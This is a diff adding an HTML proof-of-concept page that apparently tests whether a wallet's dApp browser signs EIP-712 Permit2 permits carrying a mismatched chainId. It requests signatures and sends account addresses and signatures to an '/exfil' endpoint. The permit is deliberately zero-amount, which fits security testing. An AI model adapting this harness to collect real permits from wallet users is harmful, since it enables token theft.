@@ -1,0 +1,94 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>EIP-712 chainId PoC</title>
+<body style="background:#111;color:#0f0;font:14px monospace;padding:10px">
+<pre id="o">EIP-712 chainId PoC</pre>
+<button id="b1" style="display:block;margin:8px 0;padding:12px;font:14px monospace">Sign: domain.chainId = 1 (Ethereum)</button>
+<button id="b56" style="display:block;margin:8px 0;padding:12px;font:14px monospace">Control: domain.chainId = 56 (BSC)</button>
+<button id="bc" style="display:block;margin:8px 0;padding:12px;font:14px monospace">Probe provider / chainId only</button>
+<script>
+const log = (t, d) => {
+  document.getElementById('o').textContent += '\n' + t + ' ' + String(d).slice(0, 300);
+  fetch('/exfil?tag=' + encodeURIComponent(t) + '&d=' + encodeURIComponent(String(d).slice(0, 4000))).catch(() => {});
+};
+
+const WALLET_LOG = [];
+
+// Permit2-style permit. Harmless by construction for a throwaway wallet:
+// amount = 0, expiration far future. The point is only the domain.chainId binding.
+function typedData(chainId) {
+  return {
+    types: {
+      EIP712Domain: [
+        { name: 'name', type: 'string' },
+        { name: 'chainId', type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' },
+      ],
+      PermitSingle: [
+        { name: 'details', type: 'PermitDetails' },
+        { name: 'spender', type: 'address' },
+        { name: 'sigDeadline', type: 'uint256' },
+      ],
+      PermitDetails: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint160' },
+        { name: 'expiration', type: 'uint48' },
+        { name: 'nonce', type: 'uint48' },
+      ],
+    },
+    primaryType: 'PermitSingle',
+    domain: {
+      name: 'Permit2',
+      chainId: chainId,
+      verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+    },
+    message: {
+      details: {
+        token: '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI (mainnet)
+        amount: '0',
+        expiration: '2000000000',
+        nonce: '0',
+      },
+      spender: '0x000000000000000000000000000000000000dEaD',
+      sigDeadline: '2000000000',
+    },
+  };
+}
+
+async function sign(chainId) {
+  const prov = window.ethereum;
+  if (!prov) { log('ERR', 'no window.ethereum'); return; }
+  const tag = 'SIGN_chain' + chainId;
+  try {
+    const td = typedData(chainId);
+    log(tag + '_REQ', 'sending eth_signTypedData_v4 with domain.chainId=' + chainId);
+    const t0 = Date.now();
+    const sig = await prov.request({
+      method: 'eth_signTypedData_v4',
+      params: [ (await prov.request({ method: 'eth_accounts' }))[0], JSON.stringify(td) ],
+    });
+    log(tag + '_OK', 'SIGNED in ' + (Date.now() - t0) + 'ms sig=' + sig);
+    WALLET_LOG.push({ chainId, sig });
+    // sanity: sign hash locally later on host; also ask node to recover via precompile-free path is not possible offline — host verifies.
+  } catch (e) {
+    log(tag + '_ERR', String(e));
+  }
+}
+
+(async () => {
+  const prov = window.ethereum;
+  if (!prov) { log('PROBE', 'window.ethereum absent — open inside Trust dApp browser'); return; }
+  log('PROBE', 'ethereum present, chainId=' + await prov.request({ method: 'eth_chainId' }));
+  const accts = await prov.request({ method: 'eth_accounts' });
+  log('ACCOUNTS', JSON.stringify(accts));
+})();
+
+document.getElementById('b1').onclick  = () => sign(1);
+document.getElementById('b56').onclick = () => sign(56);
+document.getElementById('bc').onclick  = async () => {
+  if (!window.ethereum) return log('PROBE', 'no provider');
+  log('PROBE', 'chainId=' + await window.ethereum.request({ method: 'eth_chainId' }));
+};
+</script>
+</body>
+</html>
